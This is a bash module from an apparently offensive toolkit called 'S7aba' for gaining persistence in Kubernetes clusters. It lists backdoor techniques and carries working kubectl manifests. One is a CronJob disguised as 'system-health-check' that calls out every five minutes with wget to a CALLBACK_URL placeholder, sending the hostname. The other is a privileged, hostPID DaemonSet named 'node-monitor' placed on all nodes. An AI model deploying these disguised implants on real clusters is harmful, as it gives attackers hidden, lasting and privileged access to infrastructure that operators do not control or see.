#!/usr/bin/env bash
# S7aba - Kubernetes Persistence Module

enumerate_persistence_options() {
    log_info "Evaluating Kubernetes persistence techniques..."
    log_finding "HIGH" "CronJob Backdoor" "Scheduled CronJob for periodic execution"
    log_finding "HIGH" "DaemonSet" "DaemonSet for execution on all nodes (current + future)"
    log_finding "HIGH" "Static Pod" "Static pod manifest on node (survives API server outage)"
    log_finding "MEDIUM" "Mutating Webhook" "Webhook to inject sidecar into new pods"
    log_finding "MEDIUM" "SA Token" "Long-lived service account token"
    log_finding "INFO" "Backdoor Image" "Modified container image in registry"
    log_finding "INFO" "Sidecar Injection" "Add sidecar container to existing deployment"
}

deploy_persistence() {
    log_warn "Select persistence mechanism:"
    echo -e "  1) Create CronJob backdoor"
    echo -e "  2) Deploy DaemonSet on all nodes"
    echo -e "  3) Create privileged ServiceAccount"
    read -rp "$(echo -e "${YELLOW}[?] Choice: ${RESET}")" choice

    case "$choice" in
        1)
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create CronJob running every 5 minutes"
            else
                kubectl apply -f - <<'YAML'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-health-check
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: health
            image: alpine
            command: ["/bin/sh", "-c", "wget -qO- http://CALLBACK_URL/$(hostname)"]
          restartPolicy: OnFailure
YAML
                log_success "CronJob 'system-health-check' created"
            fi
            ;;
        2)
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would deploy DaemonSet on all nodes"
            else
                kubectl apply -f - <<'YAML'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      hostPID: true
      containers:
      - name: monitor
        image: alpine
        command: ["sleep", "infinity"]
        securityContext:
          privileged: true
YAML
                log_success "DaemonSet 'node-monitor' deployed on all nodes"
            fi
            ;;
        *)
            log_info "Selected mechanism requires manual implementation"
            ;;
    esac
}
